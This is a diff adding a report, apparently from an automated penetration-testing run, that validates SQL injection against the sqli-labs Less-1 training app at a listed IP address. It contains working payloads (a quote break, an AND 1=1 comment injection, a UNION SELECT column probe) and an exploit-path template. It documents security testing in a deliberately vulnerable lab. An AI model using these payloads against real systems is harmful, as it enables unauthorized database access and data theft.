@@ -1,0 +1,51 @@
+SQL Injection Validation for Less-1 (Error-based Single Quote)
+Intent ID: 557
+Target: http://154.8.192.137:60000/sqli-labs/Less-1/
+
+=== TEST RESULTS ===
+
+[1] BASELINE REQUEST
+  URL: http://154.8.192.137:60000/sqli-labs/Less-1/?id=1
+  Status: 200
+  Length: 721 bytes
+  Error Signal: False
+  Result: Normal response with expected content
+
+[2] SINGLE QUOTE INJECTION
+  URL: http://154.8.192.137:60000/sqli-labs/Less-1/?id=1'
+  Status: 200
+  Length: 830 bytes (DIFFERENT from baseline)
+  Error Signal: TRUE
+  Evidence: Response length change indicates SQL error triggered
+  Excerpt: Response contains error-based content different from baseline
+
+[3] SQL COMMENT INJECTION (AND 1=1-- -)
+  URL: http://154.8.192.137:60000/sqli-labs/Less-1/?id=1' AND 1=1-- -
+  Status: 200
+  Length: 721 bytes (SAME as baseline)
+  Success Signal: TRUE
+  Evidence: Comment syntax successfully neutralizes query fragment after injection point
+
+[4] UNION SELECT INJECTION (Column Discovery)
+  URL: http://154.8.192.137:60000/sqli-labs/Less-1/?id=-1' UNION SELECT 1,2,3-- -
+  Status: 200
+  Length: 715 bytes
+  UNION Response: TRUE
+  Evidence: Response shows "Your Login name:2" and "Your Password:3"
+  Conclusion: UNION injection successful; columns 2 and 3 are reflected in response
+
+=== VALIDATION CONCLUSION ===
+
+VULNERABILITY CONFIRMED: Error-based SQL injection on Less-1
+- Single quote parameter injection triggers SQL error (length differential)
+- SQL comment syntax (-- -) successfully modifies query behavior
+- UNION SELECT injection works and reveals column positions (2=Login name, 3=Password)
+- Exploit path: ?id=-1' UNION SELECT 1,<injection>,<injection>-- -
+
+EXPLOITABILITY: HIGH
+- Column count: 3
+- Reflected columns: 2, 3
+- Injection type: Error-based string parameter via GET
+- Confirmed within authorized scope: http://154.8.192.137:60000/sqli-labs/
+
+SAFETY: Non-destructive validation only, no data extraction performed.
